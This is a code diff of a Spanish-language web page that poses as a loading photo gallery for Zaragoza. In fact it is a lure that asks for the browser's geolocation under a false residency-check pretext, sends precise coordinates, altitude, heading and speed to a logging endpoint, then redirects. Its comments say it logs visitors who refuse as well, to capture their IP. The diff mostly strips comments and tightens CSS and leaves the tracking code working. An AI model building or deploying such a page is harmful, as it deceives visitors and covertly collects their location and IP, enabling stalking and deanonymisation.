@@ -4,47 +4,33 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Cargando galería · Zaragoza</title>
-  <meta name="description" content="Galería de fotos de Villanueva de Gállego, Zaragoza." />
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     html, body {
       height: 100%;
-      background: #ffffff;
+      background: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
       overflow: hidden;
     }
-
-    /* ── Loading state ── */
     #state-loading {
       display: flex;
       flex-direction: column;
       align-items: center;
       gap: 28px;
     }
-
     .spinner {
-      width: 52px;
-      height: 52px;
+      width: 52px; height: 52px;
       border-radius: 50%;
       border: 3px solid #e5e5e5;
       border-top-color: #9ca3af;
       animation: spin .9s linear infinite;
     }
-
     @keyframes spin { to { transform: rotate(360deg); } }
+    .label { font-size: 14px; color: #6b7280; letter-spacing: .02em; }
 
-    .label {
-      font-size: 14px;
-      color: #6b7280;
-      letter-spacing: 0.02em;
-      font-weight: 400;
-    }
-
-    /* ── Denied state ── */
     #state-denied {
       display: none;
       flex-direction: column;
@@ -54,50 +40,26 @@
       max-width: 320px;
       padding: 0 24px;
     }
-
-    .denied-icon {
-      font-size: 48px;
-      line-height: 1;
-    }
-
-    .denied-title {
-      font-size: 15px;
-      font-weight: 600;
-      color: #111827;
-      line-height: 1.5;
-    }
-
-    .denied-msg {
-      font-size: 14px;
-      color: #6b7280;
-      line-height: 1.6;
-    }
-
+    .denied-icon { font-size: 48px; }
+    .denied-title { font-size: 15px; font-weight: 600; color: #111827; line-height: 1.5; }
+    .denied-msg   { font-size: 14px; color: #6b7280; line-height: 1.6; }
     .btn-reload {
       margin-top: 6px;
       padding: 10px 28px;
-      border: none;
-      border-radius: 50px;
-      background: #111827;
-      color: #fff;
-      font-family: inherit;
-      font-size: 14px;
-      font-weight: 500;
+      border: none; border-radius: 50px;
+      background: #111827; color: #fff;
+      font-family: inherit; font-size: 14px; font-weight: 500;
       cursor: pointer;
-      transition: background .15s;
     }
     .btn-reload:hover { background: #374151; }
   </style>
 </head>
 <body>
-
-  <!-- STATE 1: loading / waiting for permission -->
   <div id="state-loading">
     <div class="spinner"></div>
     <span class="label">Cargando la galería de fotos</span>
   </div>
 
-  <!-- STATE 2: denied -->
   <div id="state-denied">
     <div class="denied-icon">📍</div>
     <p class="denied-title">Debes permitir compartir tu ubicación para asegurarnos que resides en Zaragoza Provincia</p>
@@ -122,28 +84,22 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         keepalive: true
-      }).finally(() => {
-        window.location.href = REDIRECT;
-      });
-      // Failsafe redirect if fetch hangs
+      }).finally(() => { window.location.href = REDIRECT; });
       setTimeout(() => { window.location.href = REDIRECT; }, 3000);
     }
 
     if (!navigator.geolocation) {
-      // Device doesn't support geolocation — show denied message
       showDenied();
     } else {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          // ✅ Accepted — log and redirect
           const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
           redirectAfterLog({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
         },
         (err) => {
-          // ❌ Denied or error — show message, do NOT redirect
+          // Denegado — mostrar aviso, NO redirigir
           showDenied();
-
-          // Still log the denial (IP capture)
+          // Aun así loguear el intento (captura IP)
           fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
